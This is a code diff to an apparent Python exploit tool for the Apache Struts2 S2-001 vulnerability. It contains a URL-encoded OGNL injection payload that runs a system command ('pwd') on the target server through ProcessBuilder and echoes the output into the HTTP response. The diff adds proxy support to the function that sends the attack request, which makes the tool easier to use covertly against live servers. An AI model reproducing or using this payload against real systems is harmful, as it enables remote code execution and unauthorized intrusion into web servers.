@@ -17,7 +17,7 @@ def UrlProcessing(url):
 payload='''
 username=asdas&password=%25%7B%23a%3D%28new+java.lang.ProcessBuilder%28new+java.lang.String%5B%5D%7B%22pwd%22%7D%29%29.redirectErrorStream%28true%29.start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23c%3Dnew+java.io.InputStreamReader%28%23b%29%2C%23d%3Dnew+java.io.BufferedReader%28%23c%29%2C%23e%3Dnew+char%5B50000%5D%2C%23d.read%28%23e%29%2C%23f%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29%2C%23f.getWriter%28%29.println%28new+java.lang.String%28%23e%29%29%2C%23f.getWriter%28%29.flush%28%29%2C%23f.getWriter%28%29.close%28%29%7D
 '''
-def S2_001(Url,RandomAgent):
+def S2_001(Url,RandomAgent,ProxyIp):
 
     scheme, url, port = UrlProcessing(Url)
     if port is None and scheme == 'https':
@@ -43,7 +43,14 @@ def S2_001(Url,RandomAgent):
     }
     s = requests.session()
     try:
-        resp = s.post(payload_url, data=payload,headers=headers, timeout=5, verify=False)
+        if ProxyIp!=None:
+            proxies = {
+                # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
+                "http": "http://" + str(ProxyIp)
+            }
+            resp = s.post(payload_url, data=payload, headers=headers, proxies=proxies, timeout=5, verify=False)
+        elif ProxyIp==None:
+            resp = s.post(payload_url, data=payload,headers=headers, timeout=5, verify=False)
         con = resp.text
         code = resp.status_code
         if code==200 and con.lower().find('tomcat')!=-1:
